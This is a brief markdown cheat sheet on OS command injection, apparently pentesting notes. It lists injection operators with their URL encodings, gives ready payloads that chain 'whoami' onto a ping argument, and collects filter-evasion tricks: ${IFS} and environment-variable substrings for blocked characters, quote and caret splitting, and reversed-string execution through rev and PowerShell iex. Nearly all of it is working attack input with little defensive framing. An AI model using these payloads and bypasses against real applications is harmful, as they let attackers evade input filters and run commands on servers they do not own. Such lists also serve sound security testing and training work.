## Command Injections

```txt
Semicolon 	; 	%3b 	Both
New Line 	\n 	%0a 	Both
Background 	& 	%26 	Both (second output generally shown first)
Pipe 	| 	%7c 	Both (only second output is shown)
AND 	&& 	%26%26 	Both (only if first succeeds)
OR 	|| 	%7c%7c 	Second (only if first fails)
Sub-Shell 	`` 	%60%60 	Both (Linux-only)
Sub-Shell 	$() 	%24%28%29 	Both (Linux-only)
Tabs %09
Space ${IFS}
```

### Payloads
```bash
ping -c 1 127.0.0.1; whoami
ping -c 1 127.0.0.1 && whoami
ping -c 1 127.0.0.1 || whoami
127.0.0.1%0a whoami
127.0.0.1%0a%09
127.0.0.1%0a${IFS}
{ls,-la}
```

### Tips Linux & Windows
```bash
echo ${PATH} -> /usr/local/bin:/usr/bin:/bin:/usr/games
echo ${PATH:0:1} -> /
echo ${LS_COLORS:10:1} -> ;

127.0.0.1${LS_COLORS:10:1}${IFS}

w'h'o'am'i
w"h"o"am"i
who^ami
who$@ami

# Linux
$(a="WhOaMi";printf %s "${a,,}")
$(rev<<<'imaohw')
echo 'whoami' | rev

# Windows
"whoami"[-1..-20] -join ''
iex "$('imaohw'[-1..-20] -join '')"
```

```powershell
# msdos
echo %HOMEPATH:~6,-11%
\
# powershell
$env:HOMEPATH[0]
\
```
